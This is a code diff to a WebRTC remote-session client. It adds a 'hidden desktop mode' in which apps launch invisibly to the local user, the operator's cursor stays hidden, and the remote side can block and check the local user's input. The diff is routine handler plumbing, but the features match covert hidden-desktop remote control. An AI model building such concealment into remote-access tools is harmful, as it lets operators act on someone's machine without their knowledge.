@@ -165,7 +165,15 @@ def _load_ice_servers() -> list[RTCIceServer]:
 
 @dataclass
 class SessionResources:
-    """Resources required to serve a remote session."""
+    """
+    Resources required to serve a remote session.
+    
+    For hidden desktop mode:
+    - set_input_blocking: Toggle local input blocking (switchable module)
+    - get_input_blocked: Check if input is currently blocked
+    - launch_app: Launches apps on hidden desktop (invisible to user)
+    - Operator cursor is automatically invisible to client
+    """
     control_handler: ControlHandler
     media_tracks: list[Any]
     close: Callable[[], None] | None = None
@@ -174,6 +182,9 @@ class SessionResources:
         [str | None, int | None, int | None, int | None], None
     ] | None = None
     set_cursor_visibility: Callable[[bool], None] | None = None
+    # Hidden desktop mode specific
+    set_input_blocking: Callable[[bool], bool] | None = None
+    get_input_blocked: Callable[[], bool] | None = None
 
 
 SessionFactory = Callable[[str | None], SessionResources | tuple[ControlHandler, list[Any]]]
@@ -756,6 +767,68 @@ class WebRTCClient:
             except Exception as exc:
                 logger.warning("Failed to update stream profile: %s", exc)
                 self._send_error(data_channel, "stream_profile_failed", "Profile update failed.")
+            return
+
+        # Hidden Desktop: Toggle local input blocking (switchable module)
+        if action == "toggle_input_blocking":
+            if not session_actions or not session_actions.set_input_blocking:
+                self._send_error(
+                    data_channel,
+                    "unsupported",
+                    "Input blocking is only available in hidden desktop mode.",
+                )
+                return
+            enabled = _parse_bool(payload.get("enabled"), True)
+            try:
+                success = session_actions.set_input_blocking(enabled)
+                is_blocked = (
+                    session_actions.get_input_blocked()
+                    if session_actions.get_input_blocked
+                    else enabled
+                )
+                self._send_payload(
+                    data_channel,
+                    {
+                        "action": "toggle_input_blocking",
+                        "enabled": enabled,
+                        "success": success,
+                        "is_blocked": is_blocked,
+                    },
+                )
+            except Exception as exc:
+                logger.warning("Failed to toggle input blocking: %s", exc)
+                self._send_error(
+                    data_channel,
+                    "input_blocking_failed",
+                    "Failed to toggle input blocking.",
+                )
+            return
+
+        # Hidden Desktop: Get input blocking status
+        if action == "get_input_blocking_status":
+            if not session_actions or not session_actions.get_input_blocked:
+                self._send_error(
+                    data_channel,
+                    "unsupported",
+                    "Input blocking status is only available in hidden desktop mode.",
+                )
+                return
+            try:
+                is_blocked = session_actions.get_input_blocked()
+                self._send_payload(
+                    data_channel,
+                    {
+                        "action": "get_input_blocking_status",
+                        "is_blocked": is_blocked,
+                    },
+                )
+            except Exception as exc:
+                logger.warning("Failed to get input blocking status: %s", exc)
+                self._send_error(
+                    data_channel,
+                    "input_blocking_status_failed",
+                    "Failed to get input blocking status.",
+                )
             return
 
         self._send_error(
